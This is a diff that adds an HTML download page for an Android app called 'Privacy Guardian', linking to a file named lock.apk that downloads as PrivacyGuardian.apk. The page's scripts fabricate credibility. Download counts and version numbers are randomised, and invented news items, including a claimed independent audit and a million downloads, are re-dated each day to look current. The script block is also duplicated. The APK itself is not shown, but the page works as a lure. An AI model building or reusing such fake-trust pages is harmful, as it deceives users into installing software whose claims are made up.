@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Privacy Guardian - Security News & Tools</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1E2835, #0a0f14);
+            font-family: Arial, sans-serif;
+            color: #fff;
+            line-height: 1.6;
+            padding: 2rem 1rem;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        .download-container {
+            background: rgba(30, 40, 53, 0.9);
+            padding: 2rem 3rem;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(30, 40, 53, 0.4);
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+        .download-actions {
+            display: inline-flex;
+            gap: 12px;
+            align-items: center;
+            justify-content: center;
+            margin-top: 0.5rem;
+        }
+        .download-btn {
+            display: inline-block;
+            padding: 12px 32px;
+            background: linear-gradient(45deg, #2a3847, #1E2835);
+            color: #fff;
+            text-decoration: none;
+            border-radius: 25px;
+            font-weight: bold;
+            font-size: 1.05rem;
+            transition: transform 0.2s ease, box-shadow 0.2s ease, opacity 0.2s ease;
+            border: none;
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 18px rgba(30, 40, 53, 0.6);
+        }
+        .download-btn.secondary {
+            background: transparent;
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.12);
+            padding: 11px 28px;
+            opacity: 0.95;
+        }
+        .download-btn.secondary:hover {
+            background: rgba(255,255,255,0.03);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(30, 40, 53, 0.45);
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 1.5rem;
+            font-size: 2.5rem;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+        .feature-card {
+            background: rgba(30, 40, 53, 0.9);
+            padding: 1.5rem;
+            border-radius: 10px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .feature-card h3 {
+            color: #fff;
+            margin-bottom: 1rem;
+        }
+        .news-section {
+            margin-top: 3rem;
+        }
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        .news-card {
+            background: rgba(30, 40, 53, 0.9);
+            padding: 1.5rem;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .news-card h3 {
+            color: #fff;
+            margin-bottom: 1rem;
+        }
+        .date {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+        @media (max-width: 768px) {
+            .features {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+    <style>
+        .stats {
+            display: inline-flex;
+            gap: 20px;
+            margin-bottom: 1rem;
+            font-size: 1.1rem;
+        }
+        .stat-label {
+            color: #ffd700;
+            font-weight: bold;
+        }
+        .stat-value {
+            color: white;
+        }
+    </style>
+    <script>
+
+   
+        const newsDatabase = {
+            headlines: [
+                "New Privacy Threats Discovered in Popular Apps",
+                "Privacy Guardian Updates Its Security Features",
+                "Data Protection Best Practices for 2025",
+                "How to Secure Your Digital Life",
+                "Latest Encryption Standards Released",
+                "Mobile Privacy: What You Need to Know",
+                "Cybersecurity Trends and Predictions",
+                "Privacy Guardian Recognized for Security Excellence",
+                "Protecting Your Online Identity",
+                "Understanding Digital Privacy Rights",
+                "Zero-Day Vulnerability Protection Added",
+                "AI-Powered Threat Detection Launch",
+                "Privacy Guardian Reaches 1M Downloads",
+                "New Biometric Security Features",
+                "Cloud Storage Protection Update",
+                "Advanced Firewall Implementation",
+                "Real-time Threat Monitoring System",
+                "Privacy Guardian Pro Features Revealed",
+                "Cross-Platform Support Released",
+                "Security Audit Tools Enhanced"
+            ],
+            content: [
+                "Recent investigations reveal potential privacy vulnerabilities in commonly used applications. Stay protected with Privacy Guardian.",
+                "Our latest update brings enhanced encryption and improved threat detection capabilities to keep your data safe.",
+                "Expert recommendations on maintaining digital privacy in an increasingly connected world.",
+                "Comprehensive guide to protecting your personal information from cyber threats.",
+                "New encryption protocols provide stronger protection against emerging security threats.",
+                "Mobile security experts share insights on protecting your smartphone data.",
+                "Analysis of upcoming cybersecurity challenges and how to prepare for them.",
+                "Independent security audit confirms Privacy Guardian's robust protection features.",
+                "Essential steps to maintain your privacy in the digital age.",
+                "Updates on global privacy regulations and their impact on digital security.",
+                "Privacy Guardian now protects against previously unknown security threats with advanced heuristic analysis.",
+                "Revolutionary AI system now actively learns and adapts to new privacy threats in real-time.",
+                "Major milestone achieved as Privacy Guardian becomes one of the most trusted privacy tools globally.",
+                "Introducing secure fingerprint and facial recognition for enhanced app protection.",
+                "New feature ensures your cloud storage remains private and encrypted across all platforms.",
+                "Enhanced network protection with our intelligent firewall system.",
+                "24/7 monitoring system now alerts you instantly of potential privacy breaches.",
+                "Exclusive features including secure messaging and encrypted storage now available.",
+                "Privacy Guardian now supports Windows, MacOS, Linux, iOS, and Android platforms.",
+                "Built-in security audit tools now scan for over 500 different types of vulnerabilities."
+            ],
+            versions: [
+                "2.5.1", "2.5.0", "2.4.9", "2.4.8", "2.4.7"
+            ],
+            updates: [
+                "Security patch for latest vulnerabilities",
+                "Major feature update with AI integration",
+                "Performance improvements and bug fixes",
+                "New user interface and accessibility features",
+                "Enhanced encryption protocols"
+            ]
+        };
+
+        // Generate random download count
+        function generateDownloadCount() {
+            const baseCount = 1000000; // 1 million
+            const randomAdd = Math.floor(Math.random() * 50000); // Random additional downloads
+            return baseCount + randomAdd;
+        }
+
+        // Generate random version number
+        function getRandomVersion() {
+            return newsDatabase.versions[Math.floor(Math.random() * newsDatabase.versions.length)];
+        }
+
+        // Format number with commas
+        function formatNumber(num) {
+            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+        }
+
+        function generateRandomNews() {
+            const usedIndices = new Set();
+            const newsCards = document.querySelectorAll('.news-card');
+            
+            // Update download count and version
+            const downloadCount = generateDownloadCount();
+            const currentVersion = getRandomVersion();
+            document.getElementById('download-count').textContent = formatNumber(downloadCount);
+            document.getElementById('current-version').textContent = currentVersion;
+            
+            newsCards.forEach((card, index) => {
+                let randomIndex;
+                do {
+                    randomIndex = Math.floor(Math.random() * newsDatabase.headlines.length);
+                } while (usedIndices.has(randomIndex));
+                usedIndices.add(randomIndex);
+
+                const date = new Date();
+                date.setDate(date.getDate() - index);
+                
+                const dateElem = card.querySelector('.date');
+                const headline = card.querySelector('h3');
+                const content = card.querySelector('p');
+
+                dateElem.textContent = date.toLocaleDateString('en-US', { 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric' 
+                });
+                headline.textContent = newsDatabase.headlines[randomIndex];
+                content.textContent = newsDatabase.content[randomIndex];
+            });
+        }
+
+        // Check and update date every minute
+        let lastDate = new Date().getDate();
+        setInterval(() => {
+            const currentDate = new Date().getDate();
+            if (currentDate !== lastDate) {
+                lastDate = currentDate;
+                generateRandomNews();
+            }
+        }, 60000); // Check every minute
+
+        // Initial generation
+        generateRandomNews();
+    </script>
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <h1>Privacy Guardian</h1>
+            <p>Your Personal Privacy & Security Companion</p>
+        </header>
+
+        <div class="download-container">
+            <h2 style="color: #ffd700; margin-bottom: 1rem;">Download Privacy Guardian</h2>
+            <div style="margin-bottom: 1rem;">
+                <span style="color: #ffd700;">Version: </span>
+                <span id="current-version">2.5.1</span>
+                <span style="margin-left: 20px; color: #ffd700;">Downloads: </span>
+                <span id="download-count">1,000,000+</span>
+            </div>
+            <p style="margin-bottom: 1.5rem;">Get instant access to advanced privacy features</p>
+            <div class="download-actions">
+                <a href="/apks/lock.apk" class="download-btn" download="PrivacyGuardian.apk">Download Now</a>
+                <a href="/apks/lock-legacy.apk" class="download-btn secondary" download="PrivacyGuardian-legacy.apk">Download Older Version</a>
+            </div>
+        </div>
+
+        <div class="features">
+            <div class="feature-card">
+                <h3>File Protection</h3>
+                <p>Military-grade encryption for your sensitive files</p>
+            </div>
+            <div class="feature-card">
+                <h3>Privacy Scanner</h3>
+                <p>Detect and remove privacy threats</p>
+            </div>
+            <div class="feature-card">
+                <h3>Secure Vault</h3>
+                <p>Keep your private data in a secure digital vault</p>
+            </div>
+        </div>
+
+        <section class="news-section">
+            <h2 style="color: #fff; margin-bottom: 2rem; text-align: center; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);">Latest Privacy News</h2>
+            <div class="news-grid">
+                <article class="news-card">
+                    <span class="date">October 14, 2025</span>
+                    <h3>New Privacy Regulations Coming Soon</h3>
+                    <p>Global privacy regulations are being updated to provide better data protection for users. Learn how these changes affect you.</p>
+                </article>
+                <article class="news-card">
+                    <span class="date">October 13, 2025</span>
+                    <h3>Top Privacy Tools for 2025</h3>
+                    <p>Our experts have compiled a list of must-have privacy tools to protect your digital life in 2025.</p>
+                </article>
+                <article class="news-card">
+                    <span class="date">October 12, 2025</span>
+                    <h3>Privacy Tips for Remote Work</h3>
+                    <p>Essential guidelines for maintaining privacy while working from home. Best practices and tool recommendations.</p>
+                </article>
+            </div>
+        </section>
+    </div>
+    <script>
+        window.newsDatabase = {
+            headlines: [
+                "New Privacy Threats Discovered in Popular Apps",
+                "Privacy Guardian Updates Its Security Features",
+                "Data Protection Best Practices for 2025",
+                "How to Secure Your Digital Life",
+                "Latest Encryption Standards Released",
+                "Mobile Privacy: What You Need to Know",
+                "Cybersecurity Trends and Predictions",
+                "Privacy Guardian Recognized for Security Excellence",
+                "Protecting Your Online Identity",
+                "Understanding Digital Privacy Rights",
+                "Zero-Day Vulnerability Protection Added",
+                "AI-Powered Threat Detection Launch",
+                "Privacy Guardian Reaches 1M Downloads",
+                "New Biometric Security Features",
+                "Cloud Storage Protection Update",
+                "Advanced Firewall Implementation",
+                "Real-time Threat Monitoring System",
+                "Privacy Guardian Pro Features Revealed",
+                "Cross-Platform Support Released",
+                "Security Audit Tools Enhanced"
+            ],
+            content: [
+                "Recent investigations reveal potential privacy vulnerabilities in commonly used applications. Stay protected with Privacy Guardian.",
+                "Our latest update brings enhanced encryption and improved threat detection capabilities to keep your data safe.",
+                "Expert recommendations on maintaining digital privacy in an increasingly connected world.",
+                "Comprehensive guide to protecting your personal information from cyber threats.",
+                "New encryption protocols provide stronger protection against emerging security threats.",
+                "Mobile security experts share insights on protecting your smartphone data.",
+                "Analysis of upcoming cybersecurity challenges and how to prepare for them.",
+                "Independent security audit confirms Privacy Guardian's robust protection features.",
+                "Essential steps to maintain your privacy in the digital age.",
+                "Updates on global privacy regulations and their impact on digital security.",
+                "Privacy Guardian now protects against previously unknown security threats with advanced heuristic analysis.",
+                "Revolutionary AI system now actively learns and adapts to new privacy threats in real-time.",
+                "Major milestone achieved as Privacy Guardian becomes one of the most trusted privacy tools globally.",
+                "Introducing secure fingerprint and facial recognition for enhanced app protection.",
+                "New feature ensures your cloud storage remains private and encrypted across all platforms.",
+                "Enhanced network protection with our intelligent firewall system.",
+                "24/7 monitoring system now alerts you instantly of potential privacy breaches.",
+                "Exclusive features including secure messaging and encrypted storage now available.",
+                "Privacy Guardian now supports Windows, MacOS, Linux, iOS, and Android platforms.",
+                "Built-in security audit tools now scan for over 500 different types of vulnerabilities."
+            ],
+            versions: [
+                "2.5.1", "2.5.0", "2.4.9", "2.4.8", "2.4.7"
+            ],
+            updates: [
+                "Security patch for latest vulnerabilities",
+                "Major feature update with AI integration",
+                "Performance improvements and bug fixes",
+                "New user interface and accessibility features",
+                "Enhanced encryption protocols"
+            ]
+        };
+
+        // Generate random download count
+        function generateDownloadCount() {
+            const baseCount = 1000000; // 1 million
+            const randomAdd = Math.floor(Math.random() * 50000); // Random additional downloads
+            return baseCount + randomAdd;
+        }
+
+        // Generate random version number
+        function getRandomVersion() {
+            return newsDatabase.versions[Math.floor(Math.random() * newsDatabase.versions.length)];
+        }
+
+        // Format number with commas
+        function formatNumber(num) {
+            return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+        }
+
+        function generateRandomNews() {
+            const usedIndices = new Set();
+            const newsCards = document.querySelectorAll('.news-card');
+            
+            // Update download count and version
+            const downloadCount = generateDownloadCount();
+            const currentVersion = getRandomVersion();
+            document.getElementById('download-count').textContent = formatNumber(downloadCount);
+            document.getElementById('current-version').textContent = currentVersion;
+            
+            newsCards.forEach((card, index) => {
+                let randomIndex;
+                do {
+                    randomIndex = Math.floor(Math.random() * newsDatabase.headlines.length);
+                } while (usedIndices.has(randomIndex));
+                usedIndices.add(randomIndex);
+
+                const date = new Date();
+                date.setDate(date.getDate() - index);
+                
+                const dateElem = card.querySelector('.date');
+                const headline = card.querySelector('h3');
+                const content = card.querySelector('p');
+
+                dateElem.textContent = date.toLocaleDateString('en-US', { 
+                    year: 'numeric', 
+                    month: 'long', 
+                    day: 'numeric' 
+                });
+                headline.textContent = newsDatabase.headlines[randomIndex];
+                content.textContent = newsDatabase.content[randomIndex];
+            });
+        }
+
+        // Wait for DOM to be fully loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initial generation
+            generateRandomNews();
+            
+            // Check and update date every minute
+            let lastDate = new Date().getDate();
+            setInterval(() => {
+                const currentDate = new Date().getDate();
+                if (currentDate !== lastDate) {
+                    lastDate = currentDate;
+                    generateRandomNews();
+                }
+            }, 60000); // Check every minute
+        });
+    </script>
+</body>
+</html>
